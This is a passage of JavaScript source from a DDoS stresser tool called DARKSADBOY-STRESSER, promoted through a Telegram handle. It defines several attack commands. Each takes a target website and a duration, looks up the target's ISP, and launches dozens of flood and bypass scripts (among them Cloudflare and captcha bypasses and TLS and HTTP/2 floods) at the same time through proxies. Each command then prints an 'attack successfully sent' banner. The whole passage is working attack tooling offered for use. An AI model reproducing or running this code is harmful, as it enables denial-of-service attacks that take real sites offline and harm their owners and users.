[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝑭𝑳𝑶𝑶𝑫\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tlsv1 = path.join(__dirname, `/lib/cache/tlsv1.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const sadv2 = path.join(__dirname, `/lib/cache/sadv2.js`);
const sadv1 = path.join(__dirname, `/lib/cache/sadv1.js`);
const skynet = path.join(__dirname, `/lib/cache/skynet.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const xyn = path.join(__dirname, `/lib/cache/xyn.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const cfbypass = path.join(__dirname, `/lib/cache/cfbypass.js`);
const black = path.join(__dirname, `/lib/cache/black.js`);
const browser = path.join(__dirname, `/lib/cache/browser.js`);
const kilua = path.join(__dirname, `/lib/cache/kilua.js`);
const mabukcinta = path.join(__dirname, `/lib/cache/mabukcinta.js`);
const mantan = path.join(__dirname, `/lib/cache/mantan.js`);
const flaybypass = path.join(__dirname, `/lib/cache/flaybypass.js`);
const flayingraw = path.join(__dirname, `/lib/cache/flayingraw.js`);
const ack = path.join(__dirname, `/lib/cache/ack.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const flood1 = path.join(__dirname, `/lib/cache/flood1.js`);
const floodapi = path.join(__dirname, `/lib/cache/floodapi.js`);
const brow = path.join(__dirname, `/lib/cache/brow.js`);
const astral = path.join(__dirname, `/lib/cache/astral.js`);
const java = path.join(__dirname, `/lib/cache/java.js`);
const cat = path.join(__dirname, `/lib/cache/cat.js`);
const cf = path.join(__dirname, `/lib/cache/cf.js`);
const blast = path.join(__dirname, `/lib/cache/blast.js`);
const boti = path.join(__dirname, `/lib/cache/boti.js`);
const floodv2 = path.join(__dirname, `/lib/cache/floodv2.js`);
const bypassv2 = path.join(__dirname, `/lib/cache/bypassv2.js`);
const yuni = path.join(__dirname, `/lib/cache/yuni.js`);
const chaptcha = path.join(__dirname, `/lib/cache/chaptcha.js`);
const tlsdark = path.join(__dirname, `/lib/cache/tlsdark.js`)
const nightc2 = path.join(__dirname, `/lib/cache/nightc2.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const strike = path.join(__dirname, `/lib/cache/strike.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const rapid = path.join(__dirname, `/lib/cache/rapid.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const hold = path.join(__dirname, `/lib/cache/hold.js`);
const starstls = path.join(__dirname, `/lib/cache/starstls.js`);
const darkforce = path.join(__dirname, `/lib/cache/darkforce.js`);
const cibi = path.join(__dirname, `/lib/cache/cibi.js`);
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
        exec(`node ${tlsv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tls} ${target} ${duration} 80 10`)
        exec(`node ${sadv2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${sadv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${skynet} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${xin} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${xyn} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cfbypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${black} ${target} ${duration} 80 10`)
        exec(`node ${browser} ${target} ${duration} 80 10`)
        exec(`node ${kilua} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${mabukcinta} ${target} ${duration} 80 10`) 
        exec(`node ${mantan} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${flaybypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${flayingraw} ${target} ${duration} 80 10`)
        exec(`node ${ack} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${flood} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${flood1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${brow} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${astral} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${java} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cat} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cf} ${target} ${duration} 80 10`)
        exec(`node ${blast} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${boti} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${floodv2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${bypassv2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${yuni} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${chaptcha} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlsdark} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${nightc2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${destroy} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${strike} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${rape} GET ${duration} 10 proxy.txt 80 ${target}`)
        exec(`node ${rapid} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hold} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${starstls} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${darkforce} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cibi} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ciko} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
// [========================================] //
async function darksadboy(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Darksadboy <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Darksadboy https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const darksadboy = path.join(__dirname, `/lib/cache/darksadboy.js`);
const boti = path.join(__dirname, `/lib/cache/.js`);
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
const chaptcha = path.join(__dirname, `/lib/cache/chaptcha.js`);
const kill = path.join(__dirname, `/lib/cache/kill.js`);
const killnet = path.join(__dirname, `/lib/cache/killnet.js`);
const geckold = path.join(__dirname, `/lib/cache/geckold.js`);
const fire = path.join(__dirname, `/lib/cache/fire.js`);
const tlssuperv2 = path.join(__dirname, `/lib/cache/tlssuperv2.js`);
        exec(`node ${darksadboy} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${boti} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ciko} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cyn} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${chaptcha} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${kill} ${target} ${duration} 80 10`)
        exec(`node ${killnet} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${geckold} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${fire} ${target} ${duration} 80 10`) 
        exec(`node ${tlssuperv2} ${target} ${port} ${duration} 80 10 proxy.txt`) 
sigma()
};
async function tls(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Tls <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Tls https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝑻𝑳𝑺\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const mabukcinta = path.join(__dirname, `/lib/cache/mabukcinta.js`);
const tlsv1 = path.join(__dirname, `/lib/cache/tlsv1.js`);
const tlsdark = path.join(__dirname, `/lib/cache/tlsdark.js`);
const tlscti = path.join(__dirname, `/lib/cache/tlscti.js`);
const yuni = path.join(__dirname, `/lib/cache/yuni.js`);
const chaptcha = path.join(__dirname, `/lib/cache/chaptcha.js`);
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
const steven = path.join(__dirname, `/lib/cache/steven.js`);
        exec(`node ${tls} ${target} ${duration} 80 10`)
        exec(`node ${mabukcinta} ${target} ${duration} 80 10`)
        exec(`node ${tlsv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlsdark} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlscti} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${yuni} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${chaptcha} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ciko} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${steven} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
async function h2dark(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: H2-Dark <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
H2-Dark https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
